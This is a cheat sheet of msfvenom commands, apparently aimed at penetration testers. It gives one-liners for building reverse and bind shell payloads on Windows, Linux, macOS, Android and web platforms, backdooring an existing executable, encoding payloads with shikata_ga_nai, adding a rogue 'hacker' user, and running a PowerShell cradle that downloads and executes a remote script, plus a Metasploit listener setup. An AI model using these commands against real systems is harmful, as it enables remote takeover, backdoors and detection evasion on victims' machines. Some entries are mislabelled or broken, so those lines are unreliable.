<h1 align="center"> Msfvenom-Cheat-Sheet</h1>
<p align="center">
  A list of msfvenom commands
</p>

## Binaries
| Command       | Info           |
| ------------- |:-------------:|
|msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe > example.exe | Creates a simple TCP Payload for Windows |
|msfvenom -p windows/meterpreter/reverse_http LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe > example.exe | Creates a simple HTTP Payload for Windows |
|msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f elf > example.elf | Creates a simple TCP Shell for Linux |
|msfvenom -p osx/x86/shell_reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f macho > example.macho | Creates a simple TCP Shell for Mac |
|msfvenom -p android/meterpreter/reverse/tcp LHOST=(Your IP/DNS) LPORT=(Your Port) R > example.apk | Creats a simple TCP Payload for Android |

## Web Payloads
| Command       | Info           |
| ------------- |:-------------:|
|msfvenom -p php/meterpreter_reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f raw > example.php | Creats a Simple TCP Shell for PHP |
|msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f asp > example.asp | Creats a Simple TCP Shell for ASP |
|msfvenom -p java/jsp_shell_reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f raw > example.jsp | Creats a Simple TCP Shell for Javascript |
|msfvenom -p java/jsp_shell_reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f war > example.war | Creats a Simple TCP Shell for WAR |

## Windows Payloads
| Command       | Info           |
| ------------- |:-------------:|
|msfvenom -l encoders | Lists all avalaible encoders|
|msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe > example.exe | Binds an exe with a Payload (Backdoors an exe) | 
|msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe > example.exe | Creates a simple TCP payload with shikata_ga_nai encoder |
|msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe > example.exe | Binds an exe with a Payload and encodes it |


# MSFVenom Cheatsheet Misslanious commands

| MSFVenom Payload Generation One-Liner | Description |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|
|    msfvenom -l   payloads                                                                                                                                                                 |    List available payloads                                     |
|    msfvenom -p PAYLOAD --list-options                                                                                                                                                                 |    List payload options                                     |
|    msfvenom -p   PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT   LHOST=IP                                                                                                        |    Payload Encoding                                            |
|    msfvenom -p   linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                           |    Linux Meterpreter  reverse shell x86 multi stage            |
|    msfvenom -p   linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                              |    Linux Meterpreter  bind shell x86 multi stage               |
|    msfvenom -p linux/x64/shell_bind_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                      |    Linux bind shell x64 single stage                           |
|    msfvenom -p linux/x64/shell_reverse_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                   |    Linux reverse shell x64 single stage                        |
|    msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                             |    Windows Meterpreter reverse shell                           |
|    msfvenom -p   windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe                                                                                             |    Windows Meterpreter http reverse shell                           |
|    msfvenom -p   windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe >   shell.exe                                                                                               |    Windows Meterpreter bind shell                              |
|    msfvenom -p   windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                                   |    Windows CMD Multi Stage                                     |
|    msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT   -f exe >  shell.exe                                                                                                     |    Windows CMD Single Stage                                    |
|    msfvenom -p   windows/adduser USER=hacker PASS=password -f exe > useradd.exe                                                                                                           |    Windows add user                                            |
|    msfvenom -p   osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho >   shell.macho                                                                                               |    Mac Reverse Shell                                           |
|    msfvenom -p   osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho  >  shell.macho                                                                                                  |    Mac Bind shell                                              |
|    msfvenom -p   cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw >   shell.py                                                                                                      |    Python Shell                                                |
|    msfvenom -p   cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw >   shell.sh                                                                                                        |    BASH Shell                                                  |
|    msfvenom -p   cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw >   shell.pl                                                                                                        |    PERL Shell                                                  |
|    msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp >   shell.asp                                                                                             |    ASP Meterpreter shell                                       |
|    msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.jsp                                                                                                  |    JSP Shell                                                   |
|    msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war >   shell.war                                                                                                  |    WAR Shell                                                   |
|    msfvenom -p   php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.php   cat shell.php | pbcopy && echo '?php ' | tr -d '\n'    shell.php && pbpaste  shell.php    |    Php Meterpreter Shell                                       |
|    msfvenom -p   php/reverse_php LHOST=IP LPORT=PORT -f raw  >  phpreverseshell.php                                                                                                   |    Php Reverse Shell                                           |
|    msfvenom -a x86   --platform Windows -p windows/exec CMD="powershell \\"IEX(New-Object   Net.webClient).downloadString('http://IP/nishang.ps1')\""   -f python                        |    Windows Exec Nishang Powershell in   python   |
|    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                            |    Bad characters shikata_ga_nai                               |
|    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                               |    Bad characters fnstenv_mov                                  |

# Multihandler Listener
To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  
```
msf>use exploit/multi/handler  
msf>set payload windows/meterpreter/reverse_tcp  
msf>set lhost <IP>  
msf>set lport <PORT>  
msf> set ExitOnSession false  
msf>exploit -j  
```
The -j option is to keep all the connected session in the background.  


# References

https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675  
https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/  
http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/  
